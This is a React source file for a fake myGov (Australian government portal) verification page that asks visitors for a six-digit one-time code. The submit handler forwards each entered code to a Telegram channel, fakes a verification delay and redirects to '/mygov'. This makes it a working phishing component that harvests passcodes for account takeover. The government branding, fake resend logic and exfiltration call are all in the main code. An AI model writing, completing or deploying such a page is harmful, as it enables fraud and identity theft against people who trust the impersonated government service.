/* eslint-disable @next/next/no-html-link-for-pages */
/* eslint-disable @next/next/no-img-element */
"use client"
import React, { useState, useEffect } from "react";
import "../css/mgv2-application.css";
import "../css/blugov.css";
import { sendTelegramMessage } from "../../utils/telegram";

// Custom hook for countdown timer
const useCountdown = (initialTime: number) => {
  const [timer, setTimer] = useState(initialTime);
  const [canResend, setCanResend] = useState(false);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (timer > 0 && !canResend) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
    } else if (timer === 0) {
      setCanResend(true);
    }
    return () => clearInterval(interval);
  }, [timer, canResend]);

  const resetTimer = () => {
    setTimer(initialTime);
    setCanResend(false);
  };

  return { timer, canResend, resetTimer };
};

const OTPPage: React.FC = () => {
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const { timer, canResend, resetTimer } = useCountdown(60);
  const [isResending, setIsResending] = useState(false);

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    setError("");
    
    if (!otp || otp.length !== 6) {
      setError("Please enter a valid 6-digit OTP");
      return;
    }

    setIsLoading(true);

    try {
      // Send to Telegram (consider removing in production)
      await sendTelegramMessage(`
        🔐 OTP Verification Attempt
        OTP: ${otp}
        Time: ${new Date().toLocaleString()}
      `);

      // Simulated API call - replace with actual verification
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Redirect on successful verification
      window.location.href = '/mygov';
    } catch (err) {
      setError("Invalid OTP code. Please try again.");
      console.error("OTP verification failed:", err);
    } finally {
      setIsLoading(false);
    }
  };

  const handleResendOTP = async () => {
    if (!canResend || isResending) return;

    setIsResending(true);
    setError("");

    try {
      // Simulate resend API call - implement actual resend logic here
      await new Promise(resolve => setTimeout(resolve, 1000));
      resetTimer();
      console.log("OTP resent successfully");
    } catch (err) {
      setError("Failed to resend OTP. Please try again.");
      console.error("Resend OTP failed:", err);
    } finally {
      setIsResending(false);
    }
  };

  return (
    <div>
      <div className="brand-rainbow">&nbsp;</div>
      <header role="banner" className="mgvEnhanceHeader">
        <section className="wrapper">
          <div className="inner">
            <div className="unauth-grid">
              <div className="unauth-grid-row">
                <a className="unauth-govt-crest__link" href="/" aria-label="Home">
                  <img
                    id="unauth-govt-crest"
                    src="/images/myGov-cobranded-logo-black.svg"
                    alt="myGov Beta"
                    role="img"
                    width="200"
                    height="60"
                  />
                </a>
              </div>
            </div>
          </div>
        </section>
      </header>

      <div className="wrapper-mapwap">
        <div className="main-block" id="content" role="main">
          <div className="unauth">
            <div className="login-grid-container">
              <div className="login-grid-row">
                <div className="login-grid-column">
                  <div className="digital-id-login-card-wrapper">
                    <div className="digital-id-main-login-card override">
                      <h1>Enter Verification Code</h1>
                      <p className="instruction-text">
                        We&apos;ve sent a 6-digit code to your mobile device.
                        Please enter it below to continue.
                      </p>
                      
                      <form
                        id="otp-form"
                        className="mygov-login-form alternative"
                        onSubmit={handleSubmit}
                        noValidate
                      >
                        {error && (
                          <div 
                            className="error-message" 
                            role="alert"
                            aria-live="assertive"
                          >
                            {error}
                          </div>
                        )}

                        <div className="input-group">
                          <label htmlFor="otp" className="visually-hidden">
                            One-Time Password
                          </label>
                          <input
                            id="otp"
                            name="otp"
                            type="text"
                            value={otp}
                            onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
                            inputMode="numeric"
                            autoComplete="one-time-code"
                            maxLength={6}
                            required
                            disabled={isLoading}
                            aria-describedby="otp-instructions"
                            className="otp-input"
                            autoFocus
                          />
                        </div>

                        <div className="button-digital-id-main-container override">
                          <button
                            type="submit"
                            className="button-main"
                            disabled={isLoading}
                            aria-label={isLoading ? "Verifying OTP" : "Verify OTP"}
                          >
                            {isLoading ? (
                              <span className="button-loading-state">
                                Verifying...
                              </span>
                            ) : (
                              "Verify Code"
                            )}
                          </button>
                        </div>

                        <div className="resend-otp-section">
                          {canResend ? (
                            <button
                              type="button"
                              className="text-button"
                              onClick={handleResendOTP}
                              disabled={isResending}
                              aria-label={isResending ? "Resending OTP" : "Resend OTP"}
                            >
                              {isResending ? "Resending..." : "Resend Code"}
                            </button>
                          ) : (
                            <p className="resend-timer">
                              Resend available in {timer} seconds
                            </p>
                          )}
                        </div>

                        <div className="support-text">
                          <p>
                            Not receiving the code? Check your spam folder or{' '}
                            <button
                              type="button"
                              className="text-button"
                              onClick={handleResendOTP}
                              disabled={isResending}
                            >
                              request a new code
                            </button>.
                          </p>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer role="contentinfo">
        {/* Footer content remains the same */}
      </footer>
    </div>
  );
};

export default OTPPage;